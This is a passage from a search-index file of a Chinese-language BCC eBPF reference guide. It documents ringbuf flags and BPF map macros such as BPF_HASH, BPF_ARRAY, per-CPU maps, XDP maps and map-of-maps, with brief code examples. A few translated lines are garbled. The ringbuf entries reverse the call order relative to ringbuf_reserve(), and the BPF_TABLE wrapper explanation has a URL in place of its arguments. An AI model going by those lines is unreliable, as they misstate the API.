<li><code>BPF_RB_FORCE_WAKEUP</code>: \u65e0\u6761\u4ef6\u53d1\u9001\u65b0\u6570\u636e\u53ef\u7528\u7684\u901a\u77e5</li> </ul> <p>BPF_RINGBUF_OUTPUT\u8868\u7684\u65b9\u6cd5\uff0c\u7528\u4e8e\u5c06\u81ea\u5b9a\u4e49\u4e8b\u4ef6\u6570\u636e\u63d0\u4ea4\u5230\u7528\u6237\u6001\u3002\u5fc5\u987b\u5728\u8c03\u7528<code>ringbuf_reserve()</code>\u4e4b\u524d\u8c03\u7528\uff0c\u4ee5\u4e3a\u6570\u636e\u9884\u7559\u7a7a\u95f4\u3002</p> <p>\u73b0\u573a\u793a\u4f8b\uff1a \u641c\u7d22/examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide/#9-ringbuf_discard","title":"9. ringbuf_discard()","text":"<p>\u8bed\u6cd5: <code>void ringbuf_discard((void *)data, u64 flags)</code></p> <p>\u8fd4\u56de\u503c: \u65e0\uff0c\u59cb\u7ec8\u6210\u529f</p> <p>\u6807\u5fd7:</p> <ul> <li><code>BPF_RB_NO_WAKEUP</code>: \u4e0d\u53d1\u9001\u65b0\u6570\u636e\u53ef\u7528\u7684\u901a\u77e5</li> <li><code>BPF_RB_FORCE_WAKEUP</code>: \u65e0\u6761\u4ef6\u53d1\u9001\u65b0\u6570\u636e\u53ef\u7528\u7684\u901a\u77e5</li> </ul> <p>BPF_RINGBUF_OUTPUT\u8868\u7684\u65b9\u6cd5\uff0c\u7528\u4e8e\u4e22\u5f03\u81ea\u5b9a\u4e49\u4e8b\u4ef6\u6570\u636e\uff1b\u7528\u6237\u7a7a\u95f4\u5c06\u5ffd\u7565\u4e0e\u4e22\u5f03\u4e8b\u4ef6\u76f8\u5173\u8054\u7684\u6570\u636e\u3002\u5fc5\u987b\u5728\u8c03\u7528<code>ringbuf_reserve()</code>\u4e4b\u524d\u8c03\u7528\uff0c\u4ee5\u4e3a\u6570\u636e\u9884\u7559\u7a7a\u95f4\u3002</p> <p>\u73b0\u573a\u793a\u4f8b\uff1a \u641c\u7d22/examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide/#maps","title":"Maps","text":"<p>Maps\u662fBPF\u6570\u636e\u5b58\u50a8\uff0c\u662f\u66f4\u9ad8\u7ea7\u5bf9\u8c61\u7c7b\u578b\uff08\u5305\u62ec\u8868\u3001\u54c8\u5e0c\u548c\u76f4\u65b9\u56fe\uff09\u7684\u57fa\u7840\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#1-bpf_table","title":"1. BPF_TABLE","text":"<p>\u8bed\u6cd5: <code>BPF_TABLE(_table_type,_key_type, _leaf_type,_name, _max_entries)</code></p> <p>\u521b\u5efa\u540d\u4e3a<code>_name</code>\u7684\u6620\u5c04\u3002\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u8fd9\u5c06\u901a\u8fc7\u66f4\u9ad8\u7ea7\u7684\u5b8f\uff08\u5982BPF_HASH\u3001BPF_ARRAY\u3001BPF_HISTOGRAM\u7b49\uff09\u4f7f\u7528\u3002</p> <p><code>BPF_F_TABLE</code>\u662f\u4e00\u4e2a\u53d8\u4f53\uff0c\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u91c7\u7528\u6807\u5fd7\u3002<code>BPF_TABLE(https://github.com/iovisor/bcc/tree/master.)</code>\u5b9e\u9645\u4e0a\u662f`BPF_F_TABLE(https://github.com/iovisor/bcc/tree/master., 0 /flag/)```\u7684\u5305\u88c5\u3002</p> <p>\u65b9\u6cd5\uff08\u7a0d\u540e\u8ba8\u8bba\uff09\uff1amap.lookup()\u3001map.lookup_or_try_init()\u3001map.delete()\u3001map.update()\u3001map.insert()\u3001map.increment()\u3002</p> <p>\u73b0\u573a\u793a\u4f8b\uff1a \u641c\u7d22/examples,\"\u641c\u7d22 /\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#_5","title":"\u56fa\u5b9a\u6620\u5c04","text":"<p>\u8bed\u6cd5: <code>BPF_TABLE_PINNED(_table_type,_key_type, _leaf_type,_name, _max_entries, \"/sys/fs/bpf/xyz\")</code></p> <p>\u5982\u679c\u6620\u5c04\u4e0d\u5b58\u5728\uff0c\u5219\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u6620\u5c04\u5e76\u5c06\u5176\u56fa\u5b9a\u5230bpffs\u4f5c\u4e3a\u6587\u4ef6\uff1b\u5426\u5219\u4f7f\u7528\u5df2\u56fa\u5b9a\u5230bpffs\u7684\u6620\u5c04\u3002\u7c7b\u578b\u4fe1\u606f\u4e0d\u5f3a\u5236\u6267\u884c\uff0c\u5b9e\u9645\u7684\u6620\u5c04\u7c7b\u578b\u53d6\u51b3\u4e8e\u56fa\u5b9a\u5230\u4f4d\u7f6e\u7684\u6620\u5c04\u3002</p> <p>\u4f8b\u5982:</p> <pre><code>BPF_TABLE_PINNED(\"hash\", u64, u64, ids, 1024, \"/sys/fs/bpf/ids\");\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide/#2-bpf_hash","title":"2. BPF_HASH","text":"<p>\u8bed\u6cd5: <code>BPF_HASH(name [, key_type [, leaf_type [, size]]])</code></p> <p>\u521b\u5efa\u4e00\u4e2a\u54c8\u5e0c\u6620\u5c04\uff08\u5173\u8054\u6570\u7ec4\uff09\uff0c\u540d\u79f0\u4e3a<code>name</code>\uff0c\u5177\u6709\u53ef\u9009\u53c2\u6570\u3002</p> <p>\u9ed8\u8ba4\u503c: <code>BPF_HASH(name, key_type=u64, leaf_type=u64, size=10240)</code></p> <p>\u4f8b\u5982:</p> <pre><code>BPF_HASH(start, struct request *);\n</code></pre> <p>\u8fd9\u5c06\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a<code>start</code>\u7684\u54c8\u5e0c\uff0c\u5176\u4e2d\u5173\u952e\u5b57\u4e3a<code>struct request *</code>\uff0c\u503c\u9ed8\u8ba4\u4e3au64\u3002\u6b64\u54c8\u5e0c\u7531disksnoop.py\u793a\u4f8b\u7528\u4e8e\u4fdd\u5b58\u6bcf\u4e2aI/O\u8bf7\u6c42\u7684\u65f6\u95f4\u6233\uff0c\u5176\u4e2d\u5173\u952e\u5b57\u662f\u6307\u5411struct request\u7684\u6307\u9488\uff0c\u800c\u503c\u662f\u65f6\u95f4\u6233\u3002</p> <p>\u8fd9\u662f<code>BPF_TABLE(\"hash\", ...)</code>\u7684\u5305\u88c5\u5b8f\u3002</p> <p>\u65b9\u6cd5\uff08\u7a0d\u540e\u6db5\u76d6\uff09\uff1amap.lookup()\uff0cmap.lookup_or_try_init()\uff0cmap.delete()\uff0cmap.update()\uff0cmap.insert()\uff0cmap.increment()\u3002</p> <p>\u793a\u4f8b\u4e2d\u7684\u539f\u4f4d\u7f6e\u94fe\u63a5\uff1a\u641c\u7d22 /\u793a\u4f8b, \u641c\u7d22 /\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#3-bpf_array","title":"3. BPF_ARRAY","text":"<p>\u8bed\u6cd5: <code>BPF_ARRAY(name [, leaf_type [, size]])</code></p> <p>\u521b\u5efa\u4e00\u4e2a\u4ee5\u6574\u6570\u7d22\u5f15\u7684\u6570\u7ec4\uff0c\u6700\u5feb\u901f\u7684\u67e5\u627e\u548c\u66f4\u65b0\u4e3a\u4f18\u5316\uff0c\u540d\u79f0\u4e3a<code>name</code>\uff0c\u5177\u6709\u53ef\u9009\u53c2\u6570\u3002</p> <p>\u9ed8\u8ba4\u503c: <code>BPF_ARRAY(name, leaf_type=u64, size=10240)</code></p> <p>\u4f8b\u5982:</p> <pre><code>BPF_ARRAY(counts, u64, 32);\n</code></pre> <p>\u8fd9\u5c06\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a<code>counts</code>\u7684\u6570\u7ec4\uff0c\u5176\u4e2d\u670932\u4e2a\u5b58\u50a8\u6876\u548c64\u4f4d\u6574\u6570\u503c\u3002funccount.py\u793a\u4f8b\u4f7f\u7528\u6b64\u6570\u7ec4\u4fdd\u5b58\u6bcf\u4e2a\u51fd\u6570\u7684\u8c03\u7528\u8ba1\u6570\u3002\".\u8fd9\u662f\u4e00\u4e2a <code>BPF_TABLE(\"array\", ...)</code> \u7684\u5305\u88c5\u5b8f\u3002</p> <p>\u65b9\u6cd5\uff08\u7a0d\u540e\u4ecb\u7ecd\uff09\uff1amap.lookup()\u3001map.update()\u3001map.increment()\u3002\u6ce8\u610f\uff0c\u6240\u6709\u6570\u7ec4\u5143\u7d20\u90fd\u9884\u5148\u5206\u914d\u4e3a\u96f6\u503c\uff0c\u65e0\u6cd5\u5220\u9664\u3002</p> <p>\u5728\u5f53\u524d\u4f4d\u7f6e\u7684\u793a\u4f8b\uff1a \u641c\u7d22/examples\uff0c \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#4-bpf_histogram","title":"4. BPF_HISTOGRAM","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_HISTOGRAM(name [, key_type [, size ]])</code></p> <p>\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <code>name</code> \u7684\u76f4\u65b9\u56fe\u6620\u5c04\uff0c\u5305\u542b\u53ef\u9009\u53c2\u6570\u3002</p> <p>\u9ed8\u8ba4\u503c\uff1a<code>BPF_HISTOGRAM(name, key_type=int, size=64)</code></p> <p>\u4f8b\u5982\uff1a</p> <pre><code>BPF_HISTOGRAM(dist);\n</code></pre> <p>\u8fd9\u521b\u5efa\u4e86\u4e00\u4e2a\u540d\u4e3a <code>dist</code> \u7684\u76f4\u65b9\u56fe\uff0c\u9ed8\u8ba4\u6709 64 \u4e2a\u6876\uff0c\u4ee5 int \u7c7b\u578b\u7684\u952e\u7d22\u5f15\u3002</p> <p>\u8fd9\u662f\u4e00\u4e2a <code>BPF_TABLE(\"histgram\", ...)</code> \u7684\u5305\u88c5\u5b8f\u3002</p> <p>\u65b9\u6cd5\uff08\u7a0d\u540e\u4ecb\u7ecd\uff09\uff1amap.increment()\u3002</p> <p>\u5728\u5f53\u524d\u4f4d\u7f6e\u7684\u793a\u4f8b\uff1a \u641c\u7d22/examples\uff0c \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#5-bpf_stack_trace","title":"5. BPF_STACK_TRACE","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_STACK_TRACE(name, max_entries)</code></p> <p>\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <code>name</code> \u7684\u5806\u6808\u8ddf\u8e2a\u6620\u5c04\uff0c\u63d0\u4f9b\u6700\u5927\u6761\u76ee\u6570\u3002\u8fd9\u4e9b\u6620\u5c04\u7528\u4e8e\u5b58\u50a8\u5806\u6808\u8ddf\u8e2a\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>BPF_STACK_TRACE(stack_traces, 1024);\n</code></pre> <p>\u8fd9\u521b\u5efa\u4e86\u4e00\u4e2a\u540d\u4e3a <code>stack_traces</code> \u7684\u5806\u6808\u8ddf\u8e2a\u6620\u5c04\uff0c\u6700\u5927\u5806\u6808\u8ddf\u8e2a\u6761\u76ee\u6570\u4e3a 1024\u3002</p> <p>\u8fd9\u662f\u4e00\u4e2a <code>BPF_TABLE(\"stacktrace\", ...)</code> \u7684\u5305\u88c5\u5b8f\u3002</p> <p>\u65b9\u6cd5\uff08\u7a0d\u540e\u4ecb\u7ecd\uff09\uff1amap.get_stackid()\u3002</p> <p>\u5728\u5f53\u524d\u4f4d\u7f6e\u7684\u793a\u4f8b\uff1a \u641c\u7d22/examples\uff0c \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#6-bpf_perf_array","title":"6. BPF_PERF_ARRAY","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_PERF_ARRAY(name, max_entries)</code></p> <p>\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <code>name</code> \u7684 perf \u6570\u7ec4\uff0c\u63d0\u4f9b\u6700\u5927\u6761\u76ee\u6570\uff0c\u8be5\u6570\u5fc5\u987b\u7b49\u4e8e\u7cfb\u7edf CPU \u7684\u6570\u91cf\u3002\u8fd9\u4e9b\u6620\u5c04\u7528\u4e8e\u83b7\u53d6\u786c\u4ef6\u6027\u80fd\u8ba1\u6570\u5668\u3002\u4f8b\u5982\uff1a</p> <pre><code>text=\"\"\"\nBPF_PERF_ARRAY(cpu_cycles, NUM_CPUS);\n\"\"\"\nb = bcc.BPF(text=text, cflags=[\"-DNUM_CPUS=%d\" % multiprocessing.cpu_count()])\nb[\"cpu_cycles\"].open_perf_event(b[\"cpu_cycles\"].HW_CPU_CYCLES)\n</code></pre> <p>\u8fd9\u5c06\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a<code>cpu_cycles</code>\u7684\u6027\u80fd\u6570\u7ec4\uff0c\u6761\u76ee\u6570\u91cf\u7b49\u4e8eCPU\u6838\u5fc3\u6570\u3002\u8be5\u6570\u7ec4\u88ab\u914d\u7f6e\u4e3a\uff0c\u7a0d\u540e\u8c03\u7528<code>map.perf_read()</code>\u5c06\u8fd4\u56de\u4ece\u8fc7\u53bb\u67d0\u4e00\u65f6\u523b\u5f00\u59cb\u8ba1\u7b97\u7684\u786c\u4ef6\u8ba1\u6570\u5668\u7684\u5468\u671f\u6570\u3002\u6bcf\u4e2a\u8868\u53ea\u80fd\u914d\u7f6e\u4e00\u79cd\u7c7b\u578b\u7684\u786c\u4ef6\u8ba1\u6570\u5668\u3002</p> <p>\u65b9\u6cd5\uff08\u7a0d\u540e\u4ecb\u7ecd\uff09\uff1a<code>map.perf_read()</code>\u3002</p> <p>\u73b0\u573a\u793a\u4f8b\uff1a \u641c\u7d22 /tests</p>"},{"location":"tutorials/bcc-documents/reference_guide/#7-bpf_percpu_hash","title":"7. BPF_PERCPU_HASH","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_PERCPU_HASH(name [, key_type [, leaf_type [, size]]])</code></p> <p>\u521b\u5efaNUM_CPU\u4e2a\u4ee5int\u7d22\u5f15\u7684\u54c8\u5e0c\u6620\u5c04\uff08\u5173\u8054\u6570\u7ec4\uff09\uff0c\u540d\u4e3a<code>name</code>\uff0c\u5177\u6709\u53ef\u9009\u53c2\u6570\u3002\u6bcf\u4e2aCPU\u90fd\u4f1a\u6709\u4e00\u4e2a\u5355\u72ec\u7684\u8be5\u6570\u7ec4\u526f\u672c\u3002\u8fd9\u4e9b\u526f\u672c\u4e0d\u4ee5\u4efb\u4f55\u65b9\u5f0f\u8fdb\u884c\u540c\u6b65\u3002</p> <p>\u8bf7\u6ce8\u610f\uff0c\u7531\u4e8e\u5185\u6838\u4e2d\u5b9a\u4e49\u7684\u9650\u5236\uff08\u4f4d\u4e8elinux/mm/percpu.c\u4e2d\uff09\uff0c<code>leaf_type</code>\u7684\u5927\u5c0f\u4e0d\u80fd\u8d85\u8fc732KB\u3002 \u6362\u53e5\u8bdd\u8bf4\uff0c<code>BPF_PERCPU_HASH</code>\u5143\u7d20\u7684\u5927\u5c0f\u4e0d\u80fd\u8d85\u8fc732KB\u3002</p> <p>\u9ed8\u8ba4\u503c\uff1a<code>BPF_PERCPU_HASH(name, key_type=u64, leaf_type=u64, size=10240)</code></p> <p>\u4f8b\u5982\uff1a</p> <pre><code>BPF_PERCPU_HASH(start, struct request *);\n</code></pre> <p>\u8fd9\u5c06\u521b\u5efa\u540d\u4e3a<code>start</code>\u7684NUM_CPU\u4e2a\u54c8\u5e0c\uff0c\u5176\u4e2d\u952e\u4e3a<code>struct request *</code>\uff0c\u503c\u9ed8\u8ba4\u4e3au64\u3002</p> <p>\u8fd9\u662f\u5bf9<code>BPF_TABLE(\"percpu_hash\", ...)</code>\u7684\u5305\u88c5\u5b8f\u3002</p> <p>\u65b9\u6cd5\uff08\u7a0d\u540e\u4ecb\u7ecd\uff09\uff1a<code>map.lookup()</code>\u3001<code>map.lookup_or_try_init()</code>\u3001<code>map.delete()</code>\u3001<code>map.update()</code>\u3001<code>map.insert()</code>\u3001<code>map.increment()</code>\u3002</p> <p>\u73b0\u573a\u793a\u4f8b\uff1a \u641c\u7d22 /examples, \u641c\u7d22 /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#8-bpf_percpu_array","title":"8. BPF_PERCPU_ARRAY","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_PERCPU_ARRAY(name [, leaf_type [, size]])</code>\u3002\u521b\u5efa<code>name</code>\u7684NUM_CPU\u4e2a\u6309\u6574\u6570\u7d22\u5f15\u4f18\u5316\u7684\u6570\u7ec4\uff0c\u4ee5\u5b9e\u73b0\u6700\u5feb\u7684\u67e5\u627e\u548c\u66f4\u65b0\uff0c\u5177\u6709\u53ef\u9009\u53c2\u6570\u3002\u6bcf\u4e2aCPU\u90fd\u4f1a\u6709\u4e00\u4e2a\u5355\u72ec\u7684\u526f\u672c\u3002\u8fd9\u4e9b\u526f\u672c\u4e0d\u80fd\u4ee5\u4efb\u4f55\u65b9\u5f0f\u540c\u6b65\u3002</p> <p>\u8bf7\u6ce8\u610f\uff0c\u7531\u4e8e\u5185\u6838\uff08\u5728linux/mm/percpu.c\u4e2d\uff09\u5b9a\u4e49\u7684\u9650\u5236\uff0c<code>leaf_type</code>\u7684\u5927\u5c0f\u4e0d\u80fd\u8d85\u8fc732KB\u3002 \u6362\u53e5\u8bdd\u8bf4\uff0c<code>BPF_PERCPU_ARRAY</code>\u5143\u7d20\u7684\u5927\u5c0f\u4e0d\u80fd\u8d85\u8fc732KB\u3002</p> <p>\u9ed8\u8ba4\u503c\uff1a<code>BPF_PERCPU_ARRAY(name, leaf_type=u64, size=10240)</code></p> <p>\u4f8b\u5982\uff1a</p> <pre><code>BPF_PERCPU_ARRAY(counts, u64, 32);\n</code></pre> <p>\u8fd9\u5c06\u521b\u5efaNUM_CPU\u4e2a\u540d\u4e3a<code>counts</code>\u7684\u6570\u7ec4\uff0c\u5176\u4e2d\u6bcf\u4e2a\u6570\u7ec4\u670932\u4e2a\u6876\u548c64\u4f4d\u6574\u6570\u503c\u3002</p> <p>\u8fd9\u662f<code>BPF_TABLE(\"percpu_array\", ...)</code>\u7684\u5305\u88c5\u5b8f\u3002</p> <p>\u65b9\u6cd5\uff08\u7a0d\u540e\u4ecb\u7ecd\uff09\uff1amap.lookup()\uff0cmap.update()\uff0cmap.increment()\u3002\u8bf7\u6ce8\u610f\uff0c\u6240\u6709\u6570\u7ec4\u5143\u7d20\u90fd\u9884\u5148\u5206\u914d\u4e3a\u96f6\u503c\uff0c\u5e76\u4e14\u4e0d\u80fd\u88ab\u5220\u9664\u3002</p> <p>In situ\u793a\u4f8b\uff1a \u641c\u7d22/examples\uff0c \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#9-bpf_lpm_trie","title":"9. BPF_LPM_TRIE","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_LPM_TRIE(name [, key_type [, leaf_type [, size]]])</code></p> <p>\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a<code>name</code>\u7684\u6700\u957f\u524d\u7f00\u5339\u914d\u5b57\u5178\u6811\u6620\u5c04\uff0c\u5e26\u6709\u53ef\u9009\u53c2\u6570\u3002</p> <p>\u9ed8\u8ba4\u503c\uff1a<code>BPF_LPM_TRIE(name, key_type=u64, leaf_type=u64, size=10240)</code></p> <p>\u4f8b\u5982\uff1a</p> <pre><code>BPF_LPM_TRIE(trie, struct key_v6);\n</code></pre> <p>\u8fd9\u5c06\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a<code>trie</code>\u7684LPM\u5b57\u5178\u6811\u6620\u5c04\uff0c\u5176\u4e2d\u952e\u662f<code>struct key_v6</code>\uff0c\u503c\u9ed8\u8ba4\u4e3au64\u3002</p> <p>\u8fd9\u662f\u4e00\u4e2a\u5bf9<code>BPF_F_TABLE(\"lpm_trie\", ..., BPF_F_NO_PREALLOC)</code>\u7684\u5305\u88c5\u5b8f\u3002</p> <p>\u65b9\u6cd5\uff08\u7a0d\u540e\u4ecb\u7ecd\uff09\uff1amap.lookup()\uff0cmap.lookup_or_try_init()\uff0cmap.delete()\uff0cmap.update()\uff0cmap.insert()\uff0cmap.increment()\u3002</p> <p>In situ\u793a\u4f8b\uff1a \u641c\u7d22/examples\uff0c \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#10-bpf_prog_array","title":"10. BPF_PROG_ARRAY","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_PROG_ARRAY(name, size)</code>\u3002\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <code>name</code> \u7684\u7a0b\u5e8f\u6570\u7ec4\uff0c\u5176\u4e2d\u5305\u542b <code>size</code> \u4e2a\u6761\u76ee\u3002\u6570\u7ec4\u7684\u6bcf\u4e2a\u6761\u76ee\u8981\u4e48\u662f\u6307\u5411\u4e00\u4e2a bpf \u7a0b\u5e8f\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u8981\u4e48\u662f <code>NULL</code>\u3002\u8be5\u6570\u7ec4\u4f5c\u4e3a\u4e00\u4e2a\u8df3\u8f6c\u8868\uff0c\u4ee5\u4fbf bpf \u7a0b\u5e8f\u53ef\u4ee5\u201c\u5c3e\u8c03\u7528\u201d\u5176\u4ed6 bpf \u7a0b\u5e8f\u3002</p> <p>\u8fd9\u662f\u4e00\u4e2a <code>BPF_TABLE(\"prog\", ...)</code> \u7684\u5305\u88c5\u5b8f\u3002</p> <p>\u65b9\u6cd5\uff08\u7a0d\u540e\u4ecb\u7ecd\uff09\uff1amap.call()\u3002</p> <p>\u5b9e\u65f6\u793a\u4f8b\uff1a \u641c\u7d22 /examples, \u641c\u7d22 /tests, \u5206\u914d fd</p>"},{"location":"tutorials/bcc-documents/reference_guide/#11-bpf_devmap","title":"11. BPF_DEVMAP","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_DEVMAP(name, size)</code></p> <p>\u8fd9\u521b\u5efa\u4e86\u4e00\u4e2a\u540d\u4e3a <code>name</code> \u7684\u8bbe\u5907\u6620\u5c04\uff0c\u5176\u4e2d\u5305\u542b <code>size</code> \u4e2a\u6761\u76ee\u3002\u6620\u5c04\u7684\u6bcf\u4e2a\u6761\u76ee\u90fd\u662f\u4e00\u4e2a\u7f51\u7edc\u63a5\u53e3\u7684 <code>ifindex</code>\u3002\u6b64\u6620\u5c04\u4ec5\u5728 XDP \u4e2d\u4f7f\u7528\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>BPF_DEVMAP(devmap, 10);\n</code></pre> <p>\u65b9\u6cd5\uff08\u7a0d\u540e\u4ecb\u7ecd\uff09\uff1amap.redirect_map()\u3002</p> <p>\u5b9e\u65f6\u793a\u4f8b\uff1a \u641c\u7d22 /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide/#12-bpf_cpumap","title":"12. BPF_CPUMAP","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_CPUMAP(name, size)</code></p> <p>\u8fd9\u521b\u5efa\u4e86\u4e00\u4e2a\u540d\u4e3a <code>name</code> \u7684 CPU \u6620\u5c04\uff0c\u5176\u4e2d\u5305\u542b <code>size</code> \u4e2a\u6761\u76ee\u3002\u6620\u5c04\u7684\u7d22\u5f15\u8868\u793a CPU \u7684 ID\uff0c\u6bcf\u4e2a\u6761\u76ee\u662f\u4e3a CPU \u5206\u914d\u7684\u73af\u5f62\u7f13\u51b2\u533a\u7684\u5927\u5c0f\u3002\u6b64\u6620\u5c04\u4ec5\u5728 XDP \u4e2d\u4f7f\u7528\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>BPF_CPUMAP(cpumap, 16);\n</code></pre> <p>\u65b9\u6cd5\uff08\u7a0d\u540e\u4ecb\u7ecd\uff09\uff1amap.redirect_map()\u3002</p> <p>\u5b9e\u65f6\u793a\u4f8b\uff1a \u641c\u7d22 /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide/#13-bpf_xskmap","title":"13. BPF_XSKMAP","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_XSKMAP(name, size [, \"/sys/fs/bpf/xyz\"])</code>\u3002\u8fd9\u5c06\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a<code>name</code>\u7684xsk\u6620\u5c04\uff0c\u5e26\u6709<code>size</code>\u4e2a\u6761\u76ee\uff0c\u5e76\u5c06\u5176\u56fa\u5b9a\u5230bpffs\u4f5c\u4e3a\u4e00\u4e2a\u6587\u4ef6\u3002\u6bcf\u4e2a\u6761\u76ee\u8868\u793a\u4e00\u4e2aNIC\u7684\u961f\u5217ID\u3002\u8be5\u6620\u5c04\u4ec5\u5728XDP\u4e2d\u7528\u4e8e\u5c06\u6570\u636e\u5305\u91cd\u5b9a\u5411\u5230AF_XDP\u5957\u63a5\u5b57\u3002\u5982\u679cAF_XDP\u5957\u63a5\u5b57\u7ed1\u5b9a\u5230\u4e0e\u5f53\u524d\u6570\u636e\u5305\u7684\u961f\u5217ID\u4e0d\u540c\u7684\u961f\u5217\uff0c\u5219\u6570\u636e\u5305\u5c06\u88ab\u4e22\u5f03\u3002\u5bf9\u4e8e\u5185\u6838v5.3\u53ca\u66f4\u9ad8\u7248\u672c\uff0c\u201clookup\u201d\u65b9\u6cd5\u53ef\u7528\u4e8e\u68c0\u67e5\u5f53\u524d\u6570\u636e\u5305\u7684\u961f\u5217ID\u662f\u5426\u53ef\u7528\u4e8eAF_XDP\u5957\u63a5\u5b57\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605AF_XDP\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>BPF_XSKMAP(xsks_map, 8);\n</code></pre> <p>\u65b9\u6cd5\uff08\u7a0d\u540e\u6db5\u76d6\uff09\uff1amap.redirect_map()\u3002map.lookup()</p> <p>\u73b0\u573a\u793a\u4f8b\uff1a search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide/#14-bpf_array_of_maps","title":"14. BPF_ARRAY_OF_MAPS","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_ARRAY_OF_MAPS(name, inner_map_name, size)</code></p> <p>\u8fd9\u5c06\u521b\u5efa\u4e00\u4e2a\u5e26\u6709\u6620\u5c04\u5185\u90e8\u7c7b\u578b\uff08BPF_MAP_TYPE_HASH_OF_MAPS\uff09\u7684\u6570\u7ec4\u6620\u5c04\uff0c\u540d\u79f0\u4e3a<code>name</code>\uff0c\u5305\u542b<code>size</code>\u4e2a\u6761\u76ee\u3002\u6620\u5c04\u7684\u5185\u90e8\u5143\u6570\u636e\u7531\u6620\u5c04<code>inner_map_name</code>\u63d0\u4f9b\uff0c\u53ef\u4ee5\u662f\u9664\u4e86<code>BPF_MAP_TYPE_PROG_ARRAY</code>\u3001<code>BPF_MAP_TYPE_CGROUP_STORAGE</code>\u548c<code>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE</code>\u4e4b\u5916\u7684\u5927\u591a\u6570\u6570\u7ec4\u6216\u54c8\u5e0c\u6620\u5c04\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>BPF_TABLE(\"hash\", int, int, ex1, 1024);\nBPF_TABLE(\"hash\", int, int, ex2, 1024);\nBPF_ARRAY_OF_MAPS(maps_array, \"ex1\", 10);\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide/#15-bpf_hash_of_maps","title":"15. BPF_HASH_OF_MAPS","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_HASH_OF_MAPS(name, key_type, inner_map_name, size)</code></p> <p>\u8fd9\u5c06\u521b\u5efa\u4e00\u4e2a\u5e26\u6709\u6620\u5c04\u5185\u90e8\u7c7b\u578b\uff08BPF_MAP_TYPE_HASH_OF_MAPS\uff09\u7684\u54c8\u5e0c\u6620\u5c04\uff0c\u540d\u79f0\u4e3a<code>name</code>\uff0c\u5305\u542b<code>size</code>\u4e2a\u6761\u76ee\u3002\u6620\u5c04\u7684\u5185\u90e8\u5143\u6570\u636e\u7531\u6620\u5c04<code>inner_map_name</code>\u63d0\u4f9b\uff0c\u53ef\u4ee5\u662f\u9664\u4e86<code>BPF_MAP_TYPE_PROG_ARRAY</code>\u3001<code>BPF_MAP_TYPE_CGROUP_STORAGE</code>\u548c<code>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE</code>\u4e4b\u5916\u7684\u5927\u591a\u6570\u6570\u7ec4\u6216\u54c8\u5e0c\u6620\u5c04\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>BPF_ARRAY(ex1, int, 1024);\nBPF_ARRAY(ex2, int, 1024);\nBPF_HASH_OF_MAPS(maps_hash, struct custom_key, \"ex1\", 10);\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide/#16-bpf_stack","title":"16. BPF_STACK","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_STACK(name, leaf_type, max_entries[, flags])</code>\u3002\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <code>name</code> \u7684\u5806\u6808\uff0c\u5176\u503c\u7c7b\u578b\u4e3a <code>leaf_type</code>\uff0c\u6700\u5927\u6761\u76ee\u6570\u4e3a <code>max_entries</code>\u3002 \u5806\u6808\u548c\u961f\u5217\u6620\u5c04\u4ec5\u9002\u7528\u4e8e Linux 4.20+\u3002</p> <p>\u4f8b\u5982:</p> <pre><code>BPF_STACK(stack, struct event, 10240);\n</code></pre> <p>\u8fd9\u5c06\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <code>stack</code> \u7684\u5806\u6808\uff0c\u5176\u503c\u7c7b\u578b\u4e3a <code>struct event</code>\uff0c\u6700\u591a\u53ef\u5bb9\u7eb3 10240 \u4e2a\u6761\u76ee\u3002</p> 